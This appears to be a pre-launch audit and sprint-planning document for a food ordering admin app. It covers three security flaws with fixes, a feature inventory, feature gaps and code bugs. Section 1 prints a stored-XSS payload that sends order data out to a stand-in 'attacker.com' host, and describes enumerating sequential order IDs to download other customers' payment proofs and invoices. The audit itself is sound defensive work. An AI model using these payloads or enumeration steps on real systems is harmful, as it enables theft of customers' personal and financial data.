# ZarlyHQ Admin & Sales Manager — Final Sprint System Review

> **Scope:** Comprehensive audit of the manager and sales admin application covering security vulnerabilities, existing feature inventory, missing features, and improvement opportunities. Intended as a pre-launch sprint planning document.

---

## Table of Contents

1. [Confirmed Security Vulnerabilities](#1-confirmed-security-vulnerabilities)
2. [Existing Features Inventory](#2-existing-features-inventory)
3. [Missing Features for SME Food Business](#3-missing-features-for-sme-food-business)
4. [Existing Features to Improve](#4-existing-features-to-improve)
5. [Manager & Sales Admin Workflow Analysis](#5-manager--sales-admin-workflow-analysis)
6. [Code Bugs Requiring Immediate Fix](#6-code-bugs-requiring-immediate-fix)

---

## 1. Confirmed Security Vulnerabilities

### Vuln 1: Unauthenticated Media File Access (Payment Proofs, Signed PDFs, Complaint Evidence)

- **File:** `nginx.conf:89-93`
- **Severity:** HIGH
- **Confidence:** 9/10
- **Category:** Unauthorized File Access / PII Disclosure

**Description:**  
Nginx serves the entire `/media/` directory as a public static alias with no authentication and `Cache-Control: public`. This exposes three sensitive subdirectories:

- `payment_proofs/` — bank transfer screenshots containing customer names, account numbers, transaction references
- `complaint_evidence/` — customer-uploaded images attached to complaints
- `signed_pdfs/` — digitally signed invoices containing full name, delivery address, phone number, itemized order

**Why it's exploitable:**  
Payment proof filenames follow a fully deterministic pattern: `payment_proofs/{date}-ORDER{id}.{ext}` where `order_id` is a sequential integer. An attacker who has placed one order knows their own ID and can walk sequentially forward and backward to retrieve every other customer's bank transfer screenshot.

```nginx
# CURRENT (vulnerable)
location /media/ {
    alias /app/media/;
    expires 7d;
    add_header Cache-Control "public";   # Makes it even worse — CDNs cache it
}
```

**Exploit Scenario:**  
Attacker places an order, receives ORDER-42. They then request `/media/payment_proofs/20260521-ORDER41.jpg`, `ORDER43.jpg`, etc. — downloading DuitNow/FPX transfer screenshots for all other customers. This constitutes a PDPA (Personal Data Protection Act 2010) breach requiring mandatory notification.

**Fix:**

1. Remove the direct nginx `/media/` alias for private subdirectories.
2. Route `/media/payment_proofs/`, `/media/complaint_evidence/`, `/media/signed_pdfs/` through a Django view protected by `@login_required` and ownership check.
3. Use nginx `X-Accel-Redirect` with the `internal` directive for efficient Django-authenticated file serving:

```python
# Django view
@login_required
def serve_payment_proof(request, filename):
    order = get_object_or_404(Order, payment_proof=f'payment_proofs/{filename}')
    if order.customer != request.user and not request.user.role in ['sales_admin', 'manager']:
        raise PermissionDenied
    response = HttpResponse()
    response['X-Accel-Redirect'] = f'/private-media/payment_proofs/{filename}'
    del response['Content-Type']
    return response
```

```nginx
# nginx — internal only
location /private-media/ {
    internal;
    alias /app/media/;
}
```

---

### Vuln 2: Stored XSS via Email Campaign Compose Preview (Manager → Sales Admin)

- **File:** `templates/admins/campaign_compose.html:111`
- **Severity:** MEDIUM
- **Confidence:** 8/10
- **Category:** Stored XSS (Cross-Role)

**Description:**  
When a sales admin opens the campaign compose page and selects an email template from the dropdown, the template's `body_html` is injected into the preview pane via `innerHTML`:

```javascript
document.getElementById('previewBody').innerHTML = opt.dataset.body || '...';
```

The `body_html` is loaded from the Django template as `{{ t.body_html|escapejs }}` into the option's `data-body` attribute. `escapejs` escapes JavaScript string characters but does **not** sanitize HTML — `<img src=x onerror=alert(1)>` stored in `body_html` survives intact and executes when assigned to `innerHTML`.

**Why this is not self-XSS:**  
Email templates are authored exclusively by `@manager_required` views. Campaign compose is accessible to both sales admins and managers. A malicious manager can store a payload that executes in a sales admin's browser session.

**Exploit Scenario:**  
Rogue manager stores:
```html
<img src=x onerror="fetch('/dashboard/orders/?format=json').then(r=>r.text()).then(d=>navigator.sendBeacon('https://attacker.com/',d))">
```
When any sales admin opens campaign compose and selects that template, the payload fires — exfiltrating order data or stealing the sales admin's session cookie.

**Fix:**  
Replace `innerHTML` with DOMPurify sanitization before assignment:

```javascript
// Install: <script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
document.getElementById('previewBody').innerHTML = DOMPurify.sanitize(opt.dataset.body || '');
```

Or if only plain-text preview is needed: `document.getElementById('previewBody').textContent = opt.dataset.body`.

---

### Vuln 3: IDOR — Public Receipt Verification Leaks Signed Invoice PDFs for Any Order

- **File:** `customers/views.py:1194`, `customers/urls.py`
- **Severity:** MEDIUM
- **Confidence:** 8/10
- **Category:** IDOR / PII Disclosure

**Description:**  
The `verify_receipt` view at `/menu/verify/<int:order_id>/` requires no authentication and accepts any sequential integer as `order_id`. For approved orders with a digital signature record, it renders a signed PDF download link pointing to `/media/signed_pdfs/<filename>` — which is also publicly accessible (see Vuln 1).

This creates a two-step PII leak:  
1. Attacker enumerates `/menu/verify/1/` → `/menu/verify/N/` at 20 req/min to discover which orders have signed PDFs.  
2. Follows the download URL to retrieve the signed invoice containing: customer full name, delivery address, phone number, and itemized order.

The 20/min rate limit means ~28,800 orders can be scanned per day from a single IP.

**Fix:**  
Receipt verification is a legitimate non-repudiation feature. The simplest fix that preserves the intent:

1. Replace integer `order_id` in the URL with a cryptographically random verification token stored on the `DigitalSignature` model. Customers receive this token with their invoice — they need it to verify.
2. Or: keep the endpoint public but return only the verification result (hash match + timestamp + signer name) without the PDF download link. The signed PDF download should require authentication and ownership.

```python
# Option 1: Token-based
class DigitalSignature(models.Model):
    verify_token = models.UUIDField(default=uuid.uuid4, unique=True)
    # URL: /menu/verify/<uuid:token>/
```

---

## 2. Existing Features Inventory

### Order Management
- Full order lifecycle: `pending → approved/pending_payment → prepared → ready_for_delivery → out_for_delivery → delivered` (also `rejected`, `cancelled`, `failed`)
- Single-order accept/reject with rejection reason selection
- Bulk order accept/reject (up to 20 at once) with batch reason
- Walk-in order creation by admin (mapped to `__walkin__` system user)
- Admin-created orders for registered customers
- Prep group system — batches orders for kitchen preparation
- Priority flag on individual orders
- Force-approve orders without confirmed payment (collect on delivery)
- Order internal notes (⚠️ has a code bug — see Section 6)
- Remake order from complaint resolution

### Payment Management
- Stripe integration with webhook-confirmed payment status
- Manual payment proof upload by customer, verified by admin
- Payment proof rejection with reason + email notification
- Pending payment queue with status badges (Stripe Confirmed / Manual Proof / Stripe Pending / Waiting)
- Automatic Stripe refund on order rejection
- Manual refund tracking and `mark_refund_processed` (sudo-gated)

### Inventory
- Staged stock updates with session-based batch confirmation
- Product add/edit/delete (manager-only for add/edit/delete; sales admin for stock)
- Product availability toggle
- Category add/rename/delete
- Allergy tagging on products

### Customer CRM
- Customer list with loyalty tier (Bronze/Silver/Gold/Platinum), total spend, total orders
- Customer detail view with full order history and complaint history
- Admin notes on customer profiles
- VIP flag toggle
- Email campaign composition (template-based, opt-in enforced, rate-limited)
- Campaign history log

### Complaints & Support
- Complaint list with pending/resolved filter
- Complaint detail with Fernet-encrypted support chat (30/min rate-limited)
- Admin-side polling (1-min interval, Page Visibility API pause)
- Resolution actions: refund / remake / dismiss
- Complaint evidence image upload

### Analytics & Reporting
- Manager dashboard: revenue (today/week/month/all-time), daily revenue chart, order volume, top 5 products, CRM tier summary, top customers, complaint counts, recent audit entries, refund totals, page views, conversion/repeat rates
- Sales report with date range filter: revenue, daily chart, top 10 products, category breakdown, refund analytics, order funnel, loyalty tier breakdown
- Overdue payment detection (proofs not reviewed after 24 hours)

### Security & Audit
- SHA-256 hash-chained immutable audit log
- Audit log viewer with filter by action/actor/target/date/text
- Step-up authentication (sudo) for sensitive views — 15-minute validity window
- Rate limiting on login (10/min IP), order submission, payment upload, campaign sending, sudo (5/min user)
- Digital signature (PyHanko PKCS#7) on approved order invoices
- Public receipt verification with SHA-256 + PyHanko validation

### Staff Profiles
- Admin profile: performance stats (approved/rejected this week), password change
- Manager profile: performance stats + campaign stats, password change

---

## 3. Missing Features for SME Food Business

### Priority: High (Operational Blockers)

**3.1 Staff Account Management UI**  
There is no admin interface to create, edit, suspend, or reset passwords for `sales_admin` or `manager` accounts. Currently this requires Django shell or the raw `/admin/` superuser panel — unacceptable for a non-technical business owner.

Needed:
- Manager-only UI to create/deactivate/reset sales admin accounts
- Superuser UI (or owner panel) to manage manager accounts
- Temporary password generation on account creation with forced-change on first login

---

**3.2 Kitchen Display System (KDS) / Live Order Queue**  
Kitchen staff have no real-time view. They depend on physical printouts or someone relaying information. The prep list is a static page — not a live queue.

Needed:
- Auto-refreshing kitchen view (WebSocket or HTMX polling) showing:
  - Orders in `prepared` or `pending_payment → approved` state grouped by prep group
  - Visual countdown from estimated ready time
  - One-tap "mark as ready" per item or per prep group
- Mobile-optimized for tablet mounting in kitchen

---

**3.3 Delivery Driver Assignment Workflow**  
Courier name and tracking number fields exist on `Order` but there is no:
- Driver account type or mobile-optimized driver view
- Assignment UI (who picks up which orders)
- Status update from driver side (e.g., "picked up", "at door")
- Integration with GrabExpress / Lalamove API for automated dispatch

At minimum: a simple assignment UI where a sales admin assigns a courier name, triggers an SMS/WhatsApp notification to the driver with order details.

---

**3.4 Customer-Facing Order Tracking Page**  
Customers can view order status in their profile, but there is no dedicated shareable tracking link (e.g., `/track/ORDER-42`) that shows real-time status without requiring login — useful for sending via WhatsApp.

---

### Priority: Medium (Business Value)

**3.5 Loyalty Rewards Redemption**  
Loyalty tiers (Bronze/Silver/Gold/Platinum) are currently display-only. Customers have no benefit from achieving a higher tier. For an SME this is a missed retention tool.

Needed:
- Tier-based perks: free delivery above Gold, birthday voucher at Platinum
- Point accumulation (e.g., RM1 spent = 1 point) with redemption against future orders
- Admin UI to configure tier thresholds and perks

---

**3.6 Promotional Codes / Discount System**  
No voucher, coupon, or promo code functionality exists. This is standard for any food ordering SME — especially for acquisition campaigns or time-limited promotions.

Needed:
- Admin-created promo codes with: percentage or fixed-amount discount, minimum order value, expiry date, usage limit, per-customer usage limit
- Sales report showing discount utilization and impact on revenue

---

**3.7 Menu Scheduling / Time-Limited Items**  
No support for products available only during certain hours (e.g., lunch specials, weekend-only items). Admins must manually toggle availability, which is error-prone.

Needed:
- `available_from_time` / `available_until_time` per product
- `available_days` bitmask (Mon–Sun)
- Automated cron-based availability toggle with audit log entry

---

**3.8 Product Ratings & Review Dashboard**  
`OrderRating` and `ProductReview` models exist, but there is no admin view to surface aggregate ratings, identify low-rated products, or respond to reviews.

Needed:
- Admin analytics: average rating per product, rating distribution chart
- Flag products below 3.5 stars for manager attention
- Manager ability to add a public response to a review

---

**3.9 Table / Dine-In Order Support**  
Walk-in orders are modeled as delivery orders with no address. There is no table number field, QR-code-based table ordering, or dine-in vs takeaway distinction in reporting.

Needed:
- `order_type`: delivery / takeaway / dine_in
- `table_number` field for dine-in orders
- Separate reporting breakdown by order type

---

**3.10 Estimated Delivery Time (End-to-End)**  
Migration `0026_order_estimated_delivery_at.py` suggests this field was planned but it does not appear to be wired into any view or customer-facing notification. Complete the implementation:
- Admin sets estimated delivery time on order approval
- Customer receives WhatsApp/email notification with the ETA
- ETA displayed on the customer order tracking page

---

### Priority: Low (Analytics & Compliance)

**3.11 Cost of Goods (COGS) / Margin Tracking**  
Revenue is tracked comprehensively but there is no mechanism to enter product cost prices. Profit margin analysis is impossible — critical for any SME trying to understand actual profitability vs. just revenue.

**3.12 Shift-Based Reporting**  
The sales report supports day/week/month but not lunch/dinner shift breakdown. An hourly revenue heatmap would help staffing decisions.

**3.13 Supplier Management**  
No supplier records, purchase orders, or restocking workflow. Currently inventory is managed by manually editing stock counts with no record of how stock was replenished.

**3.14 Automated Low-Stock Alerts**  
No notification when a product's stock count falls below a configurable threshold. Admins must check inventory manually to discover out-of-stock situations before customers encounter them.

---

## 4. Existing Features to Improve

### 4.1 Audit Log — Incomplete Action Type Coverage

Several audit events are logged with invalid or mismatched `action_type` values that do not appear in `ACTION_CHOICES` and cannot be filtered in the audit log UI:

| Code Location | Incorrect action_type | Should Be |
|---|---|---|
| `admins/views.py:129` | `login_rate_limited` | Add to ACTION_CHOICES + migration |
| `admins/views.py:1459` | `order_approved_unpaid` | Add to ACTION_CHOICES + migration |
| `admins/views.py:2101, 2183` | `inventory_updated` (for campaign sends) | `campaign_sent` — add to ACTION_CHOICES |

**Impact:** Security team cannot reliably search for rate-limited brute-force attempts. Campaign sending events are silently mislabeled as inventory changes.

---

### 4.2 Payment Proof Workflow — Missing SLA Alerts

The dashboard shows `overdue_payment_count` (proofs not reviewed after 24 hours), but there is no proactive notification. A sales admin who is away or busy will miss overdue proofs.

**Improvement:** Send an internal notification (dashboard alert + email to manager) when any payment proof has been pending review for more than 2 hours during business hours.

---

### 4.3 Email Campaign — Template Management UX

- No template preview before sending from the compose page (only a text snippet is shown)
- No A/B testing capability
- No campaign scheduling (send now only)
- No unsubscribe link enforcement verification — templates can be created without an unsubscribe link, which violates PDPA email marketing requirements

**Improvement:** Add a validation check that `body_html` contains `{{ unsubscribe_url }}` (or equivalent) before allowing template creation. Add a "full preview" modal that renders the template as it would appear in an email client.

---

### 4.4 Refund Management — Tracking Granularity

Refunds are tracked but there is no distinction between:
- Refund initiated (Stripe refund queued)
- Refund confirmed (Stripe webhook confirmed)
- Manual refund completed by bank transfer

For Stripe refunds this is automatable via the `charge.refund.updated` webhook. Currently `mark_refund_processed` is a manual step that requires sudo — correct for manual refunds but unnecessary for Stripe refunds.

---

### 4.5 Sales Admin Complaint Resolution — No Escalation Path

When a complaint exceeds the sales admin's authority (e.g., a large refund for a high-value order), there is no formal escalation path. The sales admin can only: refund, remake, or dismiss. There is no "escalate to manager" action that creates a manager task.

**Improvement:** Add an "Escalate to Manager" button that:
1. Sends an internal notification to all managers
2. Flags the complaint with `escalated_at` timestamp
3. Removes it from the regular pending queue until resolved by a manager

---

### 4.6 Walk-In Order Workflow — Missing Customer Association

Walk-in orders are mapped to a system user `__walkin__`. If the walk-in customer is a registered user, there is no way to associate the order with their account for loyalty tracking. The walk-in creation form does not offer a customer lookup.

**Improvement:** Add optional customer lookup (by phone or email) when creating walk-in orders. If a matching customer is found, attach the order to their account for loyalty point accumulation.

---

### 4.7 Order Cancellation (Distinct from Rejection)

Admins can only **reject** orders (implies the order never moved forward). There is no **cancellation** action for orders that were accepted but cannot be fulfilled (e.g., ingredient ran out after approval).

Cancellation should:
- Be available on approved orders (not just pending)
- Automatically trigger a refund if payment was collected
- Send a cancellation notification with a reason
- Not negatively count against the sales admin's rejection metrics

---

## 5. Manager & Sales Admin Workflow Analysis

### Role Boundaries

| Feature | Sales Admin | Manager |
|---|:---:|:---:|
| View/accept/reject orders | ✓ | ✓ |
| Create walk-in orders | ✓ | ✓ |
| Verify payment proofs | ✓ | ✓ |
| Manage support chats | ✓ | ✓ |
| Resolve complaints | ✓ | ✓ |
| Edit stock counts | ✓ | ✓ |
| Add/edit/delete products | ✗ | ✓ (sudo) |
| Customer CRM & notes | ✗ | ✓ |
| Email campaigns | ✗ | ✓ |
| Analytics dashboard | ✗ | ✓ |
| Sales report | ✗ | ✓ (sudo) |
| Audit log | ✗ | ✓ (sudo) |
| Refund processing | ✗ | ✓ (sudo) |

The role boundary is well-designed. The sudo (step-up auth) gates on irreversible or high-impact actions are appropriate.

### Workflow Analysis: Sales Admin Day-in-the-Life

**Morning:**
1. Check dashboard for overdue payment proofs (no proactive alert — must check manually)
2. Review pending orders queue
3. Accept/reject orders — bulk action works well for peak periods
4. Verify manually-uploaded payment proofs one by one (can be a bottleneck)

**Throughout the day:**
5. Monitor support chat for incoming complaints (1-min polling, pauses when tab hidden — good)
6. Handle complaint resolutions (refund/remake/dismiss — no escalation path)
7. Manage prep groups and track order progression through the kitchen
8. Update stock counts for out-of-stock items

**Operational Gaps Identified:**
- No push notification when a new order arrives (relies on page refresh or manual checking)
- No audio alert for new orders (critical for a food business where the sales admin may be away from screen)
- No printer integration for kitchen tickets (must use browser print)
- No WhatsApp Business API integration for customer notifications (emails only)

### Workflow Analysis: Manager Day-in-the-Life

**Strategic:**
- Review analytics dashboard for revenue and complaint trends
- Monitor top customers for VIP upsell opportunities
- Plan and send email campaigns
- Review audit log for unusual activity

**Operational Oversight:**
- Review pending refunds and mark as processed
- Handle escalated complaints from sales admins (no formal escalation mechanism exists)
- Manage product catalog and pricing

**Manager Gaps:**
- No real-time notification when a high-value order is placed or rejected
- No alert when complaint count spikes above normal (could indicate quality issue)
- No manager-to-sales-admin internal messaging
- No shift handover notes system

---

## 6. Code Bugs Requiring Immediate Fix

These are confirmed bugs unrelated to security that will cause runtime errors in production.

### Bug 1: `delete_product` — UnboundLocalError After Successful Deletion

**File:** `admins/views.py:562`  
**Severity:** P1 — Crashes after deleting a product

```python
# Current (broken)
product.delete()
messages.success(request, f"'{name}' deleted from the menu.")  # name is undefined!
```

`name` is never assigned. The product name was captured into `snapshot['name']` but never into a local `name` variable. The product is deleted, then a 500 error fires. Users see an error page after successfully deleting a product and may attempt to delete again.

**Fix:**
```python
name = product.name  # capture before deletion
product.delete()
messages.success(request, f"'{name}' deleted from the menu.")
```

---

### Bug 2: `save_internal_note` — `Order.internal_note` Field Does Not Exist

**File:** `admins/views.py:737-738`  
**Severity:** P1 — Crashes on save

```python
# Current (broken)
order.internal_note = request.POST.get('note', '').strip()
order.save(update_fields=['internal_note'])  # Field does not exist on Order model
```

The `Order` model has no `internal_note` field. This raises `ValueError: The following fields do not exist in this model, are m2m fields, or are non-concrete fields: internal_note`.

**Fix:** Either add the field to the `Order` model with a migration, or remove this view if internal notes are not intended for orders.

---

### Bug 3: Audit Actions Not in ACTION_CHOICES

**File:** `admins/views.py:129, 1459, 2101, 2183`

The following `action_type` values are passed to `log_audit()` but missing from `AuditLog.ACTION_CHOICES`:
- `login_rate_limited`
- `order_approved_unpaid`
- `inventory_updated` (used for campaign sends — semantic mismatch)

These events save silently (Django CharField doesn't enforce choices at DB level) but are invisible in the audit log filter UI. Add them to `ACTION_CHOICES` and create a migration.

---

*Document generated: 2026-05-21 | ZarlyHQ Final Sprint Review*
